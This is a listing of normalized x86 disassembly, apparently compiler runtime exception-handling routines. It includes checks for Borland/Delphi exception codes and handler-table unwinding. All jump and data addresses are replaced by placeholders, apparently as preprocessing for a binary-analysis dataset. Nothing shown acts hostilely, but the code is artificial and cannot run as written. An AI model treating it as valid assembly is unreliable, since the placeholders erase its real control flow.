call sub_44f024
add esp 0xc
mov [ ebp - 0x100 ] bl
mov edx [ ebp + 0xc ]
mov ecx [ edx + 0x18 ]
mov ebx [ ecx ]
test ebx ebx
je r-xdata
mov ebx [ ebx - 0x24 ]
test ebx ebx
je r-xdata
mov eax edi
jmp r-xdata
mov ebx [ ebx ]
jmp r-xdata
xor eax eax
lea edx [ ebp - 0x100 ]
mov al [ ebp - 0x100 ]
inc eax
push eax
push [ ebx - 0x2c ]
push edx
call sub_44f268
add esp 0xc
test eax eax
je r-xdata
sub_456ecb
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
add ebx 0x8
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
jne r-xdata
xor eax eax
push 0x0
push [ esi + 0xc ]
push eax
push [ esi + 0x8 ]
push [ esi + 0x4 ]
call sub_455e70
add esp 0x14
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
add ebx 0x14
mov eax ebx
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_456f10
push ebp
mov ebp esp
add esp 0xfffffea0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax rw-data
call sub_44f3b0
mov edx [ edi + 0x1c ]
mov [ ebp - 0x30 ] edx
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x8 ]
mov [ ebp - 0x34 ] eax
mov edx [ ebp - 0x34 ]
mov ecx [ ebp + 0xc ]
sub ecx [ edx + 0x4 ]
mov [ ebp - 0x3c ] ecx
mov eax [ ebp + 0xc ]
mov edx [ eax + 0xc ]
mov [ ebp - 0x40 ] edx
cmp [ edi ] 0xeedfae6
jne r-xdata
call sub_452700
test [ edi + 0x4 ] 0x6
je r-xdata
xor eax eax
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ecx [ ebp + 0xc ]
movzx ebx [ ecx + 0x10 ]
test ebx ebx
je r-xdata
push 0x0
push [ ebp + 0xc ]
call sub_456c2d
add esp 0x8
cmp [ edi ] 0xeefface
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x1
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
mov esi ebx
mov eax [ ebp - 0x34 ]
movzx edx [ eax + esi ]
mov [ ebp - 0x38 ] edx
add esi 0x2
mov ecx [ ebp - 0x34 ]
movzx eax [ ecx + esi ]
mov [ ebp - 0x44 ] eax
add esi 0x2
mov edx [ ebp - 0x44 ]
cmp edx 0x5
ja r-xdata
mov eax 0x1
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov ecx [ ebp - 0x34 ]
mov ebx [ ecx ]
test ebx ebx
je r-xdata
mov ecx rw-data
test ecx ecx
je r-xdata
jmp [ edx * 4 + jump_table_457027 ]
jmp r-xdata
mov ebx [ ebp - 0x38 ]
test ebx ebx
jne r-xdata
push 0xc00
push rw-data
push rw-data
call sub_454374
add esp 0xc
test [ edi + 0x3 ] 0x80
je r-xdata
cmp [ edi ] 0xeefface
je r-xdata
cmp [ edi ] 0xeefface
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov ecx [ edi ]
sub ecx 0xeedfade
je r-xdata
test [ ebp + 0x2c ] 0x2
je r-xdata
mov [ ebp - 0x5c ] edi
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x58 ] edx
mov ecx [ ebp + 0xc ]
mov eax [ edi ]
mov [ ecx + 0x14 ] eax
lea edx [ ebp - 0x5c ]
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp - 0x34 ]
mov edx [ eax + esi ]
mov [ rw-data ] edx
push ebx
push ebp
push esi
push edi
mov ecx 0x7b
mov ebx 0x7b
mov ecx [ ebp - 0x3c ]
mov ebx rw-data
call sub_450223
pop edi
pop esi
pop ebp
pop ebx
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ edi ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp - 0x34 ]
mov eax [ edx + esi ]
push 0x1
mov eax [ ebp - 0x30 ]
push [ eax + 0xc ]
push [ ebx ]
mov edx [ ebp - 0x30 ]
push [ edx + 0x8 ]
mov ecx [ ebp - 0x30 ]
push [ ecx + 0x4 ]
call sub_455e70
add esp 0x14
test eax eax
jne r-xdata
mov ebx [ fs : 0x0 ]
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov [ fs : 0x0 ] edx
call sub_44ff8c
mov [ fs : 0x0 ] ebx
test [ ebp + 0x2c ] 0x1
jne r-xdata
sub ecx 0x1fff0
jne r-xdata
mov eax [ fs : 0x0 ]
mov [ ebp - 0x60 ] eax
push [ ebp + 0x10 ]
push [ ebp - 0x60 ]
push [ ebp + 0x18 ]
push edi
call sub_455a07
add esp 0x10
mov [ ebp - 0x30 ] eax
cmp [ ebp - 0x30 ] 0x0
je r-xdata
test eax eax
jge r-xdata
test eax eax
je r-xdata
test [ edi + 0x4 ] 0x1
je r-xdata
add ebx 0x4
mov eax [ ebp - 0x34 ]
mov edx [ eax + esi ]
mov [ ebp - 0x4c ] edx
add esi 0x4
cmp [ edi ] 0xeedfade
jne r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
mov [ ecx + 0x18 ] eax
add esi 0x4
mov edx [ ebp - 0x38 ]
mov [ ebp - 0x54 ] edx
mov ebx edx
mov eax [ ebp - 0x34 ]
mov edx [ eax + esi ]
mov [ ebp - 0x50 ] edx
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x2c ]
mov [ fs : 0x0 ] edx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov cx [ ebp - 0x38 ]
mov [ edx + 0x10 ] cx
push [ ebp - 0x30 ]
push [ ebp - 0x4c ]
call sub_456ecb
add esp 0x8
mov [ ebp - 0x48 ] eax
push edi
push [ ebp - 0x4c ]
call sub_456dc7
add esp 0x8
mov [ ebp - 0x48 ] eax
jmp r-xdata
push edi
push [ ebp + 0xc ]
call sub_4565ac
add esp 0x8
push ebx
push [ ebp + 0xc ]
call sub_456c2d
add esp 0x8
mov edx [ ebp + 0xc ]
mov cx [ ebp - 0x54 ]
mov [ edx + 0x10 ] cx
cmp [ ebp - 0x44 ] 0x3
jne r-xdata
mov edx [ rw-data ]
cmp [ edx ] 0x1
je r-xdata
test [ edi + 0x3 ] 0x80
je r-xdata
cmp [ ebp - 0x48 ] 0x0
jne r-xdata
call sub_401140
and [ eax + 0x14 ] 0xfffffffd
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
cmp [ edi ] 0xeedfade
jne r-xdata
cmp [ edi ] 0xeedface
jb r-xdata
mov ecx [ rw-data ]
cmp [ ecx ] 0x2
jne r-xdata
call sub_401140
mov ecx [ ebp - 0x30 ]
mov edx [ ecx ]
mov [ eax + 0x10 ] edx
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x52 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax 0x7b
mov ebx 0x7b
mov ecx 0x7b
mov eax [ ebp - 0x50 ]
mov ebx [ ebp - 0x40 ]
mov ecx [ ebp - 0x3c ]
call sub_455967
jmp r-xdata
cmp [ ebp - 0x44 ] 0x3
jne r-xdata
push [ ebp - 0x3c ]
push [ ebp - 0x4c ]
push [ ebp - 0x30 ]
push [ ebp + 0xc ]
push [ ebp - 0x48 ]
call sub_456956
add esp 0x14
push esi
push [ ebp - 0x3c ]
push [ ebp - 0x4c ]
push edi
push [ ebp + 0xc ]
push [ ebp - 0x48 ]
call sub_456834
add esp 0x18
jmp r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0xc ]
push 0x3
push 0x2
call sub_4560a5
add esp 0x14
cmp [ edi ] 0xeefface
jbe r-xdata
cmp [ edi ] 0xeedfade
je r-xdata
push [ ebp - 0x30 ]
mov eax [ ebp - 0x30 ]
call [ eax + 0x1c ]
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x1c ] 0x14
mov edx 0x3
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov [ ebp - 0x1c ] 0x8
cmp [ edi ] 0xeedfade
jne r-xdata
mov [ ebp - 0x54 ] esi
mov ecx [ ebp - 0x48 ]
mov eax [ ecx ]
mov [ ebp - 0x50 ] eax
call sub_401140
mov eax [ eax + 0x10 ]
mov edx [ ebp - 0x30 ]
mov [ edx ] eax
call sub_401140
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x10 ] ecx
mov eax [ ebp - 0x30 ]
mov edx [ ebp + 0xc ]
mov [ eax + 0x28 ] edx
mov ecx [ ebp - 0x30 ]
mov eax [ ebp - 0x48 ]
mov [ ecx + 0x2c ] eax
mov edx [ ebp - 0x30 ]
mov [ edx + 0x30 ] esi
mov eax [ ebp - 0x30 ]
push [ eax + 0x4 ]
call sub_44f8d4
pop ecx
mov ebx eax
mov edx [ edi + 0x18 ]
mov eax [ edx ]
mov ebx [ eax - 0x2c ]
movsx eax [ ebx ]
push eax
lea edx [ ebx + 0x1 ]
push edx
lea ecx [ ebp - 0x160 ]
push ecx
call sub_44f308
movsx eax [ ebx ]
add esp 0xc
lea ebx [ ebp - 0x160 ]
mov [ ebp + eax - 0x160 ] 0x0
jmp r-xdata
mov edx [ ebp - 0x30 ]
cmp [ edx + 0x44 ] 0x0
je r-xdata
mov eax [ edi + 0x18 ]
jmp r-xdata
cmp [ edi ] 0xeedfade
jne r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0x40 ]
mov eax [ ebp - 0x30 ]
add eax 0x52
jmp r-xdata
push eax
push ebx
call sub_45608d
pop ecx
push eax
push ebx
push [ ebp - 0x50 ]
push 0x5
push 0x3
call sub_4560a5
add esp 0x18
sub_4573c9
push ebp
mov ebp esp
add esp 0xffffffdc
mov eax rw-data
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
call sub_44f3b0
test [ ebx + 0xc ] 0x2
jne r-xdata
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
push 0xc1c
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov [ ebp - 0x14 ] 0x8
mov [ ebp - 0x14 ] 0x14
mov edx [ ebp + 0x18 ]
mov ecx [ edx + 0x1c ]
cmp ecx [ ebx + 0x20 ]
jae r-xdata
push 0xc1d
push rw-data
push rw-data
call sub_454374
add esp 0xc
test esi 0x2
jne r-xdata
test esi esi
jne r-xdata
push edi
movzx ecx [ ebx + 0x2c ]
push ecx
push [ ebx + 0x28 ]
push esi
push ebx
push [ ebp + 0x8 ]
call sub_4560c2
mov [ ebp - 0x14 ] 0x8
add esp 0x18
jmp r-xdata
test edi edi
je r-xdata
push 0xc28
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x24 ]
mov eax [ ebx + 0x20 ]
jmp r-xdata
mov eax [ ebp - 0x24 ]
mov [ fs : 0x0 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x18 ]
sub [ edx + 0x1c ] eax
sub_4574c0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x18 ]
mov ebx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
jmp r-xdata
sub ebx 0xc
cmp ebx [ ebp + 0x14 ]
jae r-xdata
mov eax [ ebx + 0x4 ]
add eax edi
cmp [ ebp + 0x1c ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebx ]
test [ edx + 0xc ] 0x2
je r-xdata
mov eax [ eax ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push 0x0
push esi
push [ ebp + 0xc ]
push edx
push eax
call sub_45750b
add esp 0x1c
xor esi esi
sub_45750b
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
test [ eax + 0xc ] 0x2
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push 0xcb3
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov eax [ ebp + 0xc ]
mov ebx [ eax + 0x24 ]
mov edx [ ebp + 0xc ]
mov ebx [ edx + 0x20 ]
jmp r-xdata
test esi esi
jne r-xdata
cmp ebx esi
ja r-xdata
test esi esi
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4573c9
add esp 0x14
jmp r-xdata
test [ ebp + 0x10 ] 0x2
je r-xdata
cmp ebx esi
ja r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0xc ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ebx esi
mov eax [ ebp + 0xc ]
movzx edx [ eax + 0x12 ]
add edx [ ebp + 0xc ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push 0xced
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ ebp + 0xc ]
movzx ebx [ edx + 0x10 ]
add ebx [ ebp + 0xc ]
test ebx ebx
jne r-xdata
mov ecx [ ebp + 0xc ]
movzx eax [ ecx + 0x10 ]
add eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
test esi esi
je r-xdata
mov esi [ ebx ]
test [ esi + 0xc ] 0x2
je r-xdata
push 0xcd0
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov ecx [ ebp + 0xc ]
movzx edi [ ecx + 0x2e ]
add edi [ ebp + 0xc ]
mov [ ebp - 0x14 ] edi
test [ esi + 0x4 ] 0x1
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x1
test [ esi + 0x5 ] 0x4
je r-xdata
push 0xd65
push rw-data
push rw-data
call sub_454374
add esp 0xc
test [ esi + 0xc ] 0x2
je r-xdata
push 0xd3f
push rw-data
push rw-data
call sub_454374
add esp 0xc
test [ esi + 0xc ] 0x2
je r-xdata
push 0xd18
push rw-data
push rw-data
call sub_454374
add esp 0xc
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_4573c9
add esp 0x14
jmp r-xdata
push 0xcd4
push rw-data
push rw-data
call sub_454374
add esp 0xc
test [ esi + 0xc ] 0x2
jne r-xdata
mov eax [ esi + 0xc ]
mov [ ebp - 0x18 ] eax
mov esi [ esi + 0x8 ]
add [ ebp - 0x8 ] 0xc
jmp r-xdata
mov eax [ esi + 0x24 ]
cmp ebx eax
ja r-xdata
add [ ebp - 0x10 ] 0xc
jmp r-xdata
mov eax [ esi + 0x24 ]
cmp ebx eax
ja r-xdata
mov eax [ ebp - 0x18 ]
imul [ esi + 0x20 ]
cmp ebx eax
jbe r-xdata
push 0xd73
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ ebp - 0x8 ]
mov esi [ edx ]
test esi esi
je r-xdata
sub ebx eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x0
push ebx
push [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
add edx 0xc
push edx
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4574c0
add esp 0x20
cmp [ ebp + 0x18 ] 0x0
je r-xdata
sub ebx eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x1
push ebx
push [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
add edx 0xc
push edx
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4574c0
add esp 0x20
jmp r-xdata
mov edx [ edi + 0x4 ]
add edx [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0x18 ] 0x1
test [ eax + 0x5 ] 0x4
je r-xdata
sub ebx eax
jmp r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x1
push 0x0
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4574c0
add esp 0x20
jmp r-xdata
cmp [ ebp - 0x18 ] 0x1
jbe r-xdata
mov ecx [ eax + 0xc ]
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x8 ]
add edi 0x8
jmp r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x1
push ebx
push 0x0
push eax
push edx
call sub_45750b
add esp 0x1c
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push [ edi ]
push edx
call sub_45783e
add esp 0x14
jmp r-xdata
mov esi [ edi ]
test esi esi
jne r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x0
push 0x0
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4574c0
add esp 0x20
cmp [ ebp + 0x18 ] 0x0
je r-xdata
xor ebx ebx
sub edi 0x8
cmp edi [ ebp - 0x14 ]
jae r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push 0x1
push 0x0
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_4574c0
add esp 0x20
jmp r-xdata
sub_45783e
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
test [ ebx + 0x5 ] 0x4
jne r-xdata
mov eax [ ebx + 0x8 ]
test [ eax + 0xc ] 0x2
jne r-xdata
push 0xdcc
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ ebx + 0xc ]
mov [ ebp - 0x4 ] edx
mov ebx [ ebx + 0x8 ]
mov edi [ ebx + 0x20 ]
test edi edi
jne r-xdata
push 0xdcd
push rw-data
push rw-data
call sub_454374
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push 0xdd6
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov eax [ ebp + 0x10 ]
xor edx edx
div edi
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0x4 ]
jbe r-xdata
mov eax edi
imul [ ebp - 0x4 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x8 ]
imul edi
sub [ ebp + 0x10 ] eax
cmp edi [ ebp + 0x10 ]
jae r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
imul edx [ ebx ]
add esi edx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
push 0xde0
push rw-data
push rw-data
call sub_454374
add esp 0xc
push 0xddf
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov ecx [ ebp - 0x8 ]
add [ ebp - 0x8 ] 0xffffffff
test ecx ecx
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x10 ]
push 0x0
push ebx
push esi
call sub_45750b
add esp 0x1c
jmp r-xdata
sub esi [ ebx ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push edi
push 0x0
push ebx
push esi
call sub_45750b
add esp 0x1c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_457962
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov ebx [ edi ]
test [ ebx + 0x4 ] 0x2
jne r-xdata
mov eax [ ebx + 0xc ]
and eax 0x50
cmp eax 0x50
je r-xdata
push 0xe13
push rw-data
push rw-data
call sub_454374
add esp 0xc
cmp [ ebx + 0x8 ] 0xffffffff
jne r-xdata
mov eax esi
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax esi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebx + 0x8 ]
add edx esi
mov ebx edx
mov ebx [ ebx ]
jmp r-xdata
mov eax [ ebx - 0xc ]
mov [ edi ] eax
mov eax esi
push 0xe39
push rw-data
push rw-data
call sub_454374
add esp 0xc
sub esi [ ebx - 0x8 ]
sub ebx [ ebx - 0x4 ]
cmp [ ebx - 0x4 ] 0x0
je r-xdata
sub_4579e9
push ebp
mov ebp esp
add esp 0xffffffe4
xor eax eax
push ebx
push esi
push edi
mov [ ebp - 0x8 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov edx [ ebp + 0x10 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0xc ]
sub [ ebp - 0x4 ] edx
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x4 ] 0x20
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
test [ edx + 0x5 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x11
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
test [ eax + 0x4 ] 0x2
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ edx ]
test [ ecx + 0x4 ] 0x10
jne r-xdata
push 0xe78
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov ebx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
test [ edx + 0x5 ] 0x4
jne r-xdata
push 0xe8b
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ ebp + 0x8 ]
mov ecx [ edx ]
test [ ecx + 0xc ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x8 ]
test [ ecx + 0xc ] 0x2
jne r-xdata
push 0xe7c
push rw-data
push rw-data
call sub_454374
add esp 0xc
test [ ebx + 0x5 ] 0x10
je r-xdata
sub ebx 0xc
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
and eax 0x3
cmp eax 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov eax [ edx + 0x24 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x8 ]
mov eax [ ecx + 0x20 ]
mov [ ebp - 0x4 ] eax
push 0xe7d
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov esi [ ebx ]
mov [ ebp - 0xc ] esi
mov eax [ ebx ]
test [ eax + 0x5 ] 0x4
jne r-xdata
mov eax [ ebx ]
mov [ ebp - 0x14 ] eax
mov esi [ ebx + 0x4 ]
test esi 0x4
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
inc [ ebp - 0x8 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
test [ eax + 0x5 ] 0x4
je r-xdata
mov edx [ ebp - 0xc ]
mov esi [ edx + 0x8 ]
mov [ ebp - 0xc ] esi
mov ecx [ ebp - 0xc ]
test [ ecx + 0x4 ] 0x2
je r-xdata
mov edx [ ebx ]
mov esi [ edx + 0x8 ]
mov [ ebp - 0xc ] esi
jmp r-xdata
push 0xed7
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov edx [ ebx + 0x8 ]
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0x14 ]
add eax [ ebx + 0x8 ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
test [ esi + 0xc ] 0x2
jne r-xdata
mov edi [ esi + 0xc ]
mov esi [ esi + 0x8 ]
mov eax [ ebp - 0xc ]
test [ eax + 0xc ] 0x20
je r-xdata
mov edi 0x1
mov eax [ ebp - 0xc ]
test [ eax + 0x4 ] 0x10
je r-xdata
test esi 0x11
je r-xdata
mov ecx [ ebp - 0x14 ]
test [ ecx + 0x5 ] 0x4
jne r-xdata
test esi 0x1000
je r-xdata
imul edi [ esi + 0x20 ]
cmp edi [ ebp - 0x4 ]
jae r-xdata
push 0xf22
push rw-data
push rw-data
call sub_454374
add esp 0xc
test [ ebx + 0x4 ] 0x8
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor edi edi
mov eax [ ebp - 0x14 ]
test [ eax + 0x4 ] 0x10
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x14 ] edx
push 0xf52
push rw-data
push rw-data
call sub_454374
add esp 0xc
sub [ ebp - 0x4 ] edi
add ebx 0xc
jmp r-xdata
xor esi esi
mov eax [ ebp - 0xc ]
test [ eax + 0xc ] 0x2
jne r-xdata
mov edx esi
and edx 0x3
cmp edx 0x3
jne r-xdata
test esi 0x400
je r-xdata
mov edx [ ebp - 0x14 ]
test esi 0x1000
mov ecx [ edx + 0x8 ]
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
mov [ ebp - 0x18 ] edx
je r-xdata
push 0xf5c
push rw-data
push rw-data
call sub_454374
add esp 0xc
cmp [ ebx ] 0x0
jne r-xdata
test [ ebx + 0x4 ] 0x4
je r-xdata
push 0xef7
push rw-data
push rw-data
call sub_454374
add esp 0xc
xor edx edx
mov [ ebp - 0x4 ] edx
mov ecx ebx
add ebx 0xfffffff4
cmp ecx [ ebp + 0x8 ]
ja r-xdata
and esi 0x48
cmp esi 0x48
jne r-xdata
xor eax eax
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov edx esi
mov eax [ ebp - 0x18 ]
and edx 0x48
mov [ ebp - 0x1c ] eax
cmp edx 0x40
jne r-xdata
mov edi [ eax + 0x4 ]
mov ecx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp + 0x14 ]
add edx [ ebx + 0x8 ]
mov [ ebp - 0x10 ] edx
jmp r-xdata
xor eax eax
mov ecx [ ebp - 0x14 ]
test [ ecx + 0x5 ] 0x4
je r-xdata
sub [ ebp - 0x1c ] 0x4
push [ ebp + 0x10 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp - 0x4 ]
push eax
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_45750b
add esp 0x1c
push [ ebp + 0x10 ]
push [ ebp + 0x14 ]
push [ ebp - 0x4 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
call sub_45783e
add esp 0x14
jmp r-xdata
xor eax eax
mov edx [ ebp - 0x14 ]
movzx edi [ edx + 0x10 ]
add edi [ ebp - 0x14 ]
test edi edi
jne r-xdata
mov ecx [ ebp - 0x14 ]
test [ ecx + 0x4 ] 0x2
je r-xdata
add [ ebp - 0x18 ] 0x4
test [ ebx + 0x4 ] 0x40
je r-xdata
mov esi [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
test [ ebx + 0x5 ] 0x10
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x14 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov ecx [ ebp + 0x10 ]
test [ ecx + 0x20 ] 0x1
je r-xdata
test esi 0x400
je r-xdata
mov eax 0x2
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ edi ]
mov eax [ eax + 0x20 ]
jmp r-xdata
push 0xf92
push rw-data
push rw-data
call sub_454374
add esp 0xc
mov eax [ ebp - 0x14 ]
test [ eax + 0xc ] 0x20
je r-xdata
push esi
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
call sub_457962
add esp 0xc
mov [ ebp - 0x10 ] eax
mov esi [ ebp - 0xc ]
add [ ebp - 0x10 ] 0x4
push [ ebp - 0x1c ]
call sub_44e6dc
pop ecx
mov edx [ ebp - 0x14 ]
movzx ecx [ edx + 0x18 ]
push ecx
mov eax [ ebp - 0x14 ]
push [ eax + 0x14 ]
push [ ebp - 0x1c ]
call sub_456191
add esp 0xc
jmp r-xdata
push [ ebp - 0x1c ]
call sub_44e6ec
pop ecx
jmp r-xdata
mov eax [ ebp - 0x14 ]
movzx edx [ eax + 0x1a ]
push edx
mov ecx [ ebp - 0x14 ]
push [ ecx + 0x1c ]
push [ ebp - 0x1c ]
call sub_456191
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x20 ] 0xff
je r-xdata
mov edx [ ebp - 0x14 ]
test [ edx + 0x5 ] 0x4
je r-xdata
mov edx [ ebp - 0x4 ]
cmp edx eax
jb r-xdata
test esi 0x8
je r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ edx ]
mov eax [ eax - 0x8 ]
mov edi eax
mov eax [ ebp - 0x18 ]
call edi
push edi
lea edx [ ebp - 0x14 ]
push edx
push [ ebp - 0x18 ]
call sub_457962
add esp 0xc
mov [ ebp - 0x18 ] eax
mov ecx [ ebp - 0x18 ]
mov [ ebp - 0x1c ] ecx
sub_457e6d
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffff
jne r-xdata
mov edx [ ebx + 0x4 ]
cmp [ edx ] 0x25ff
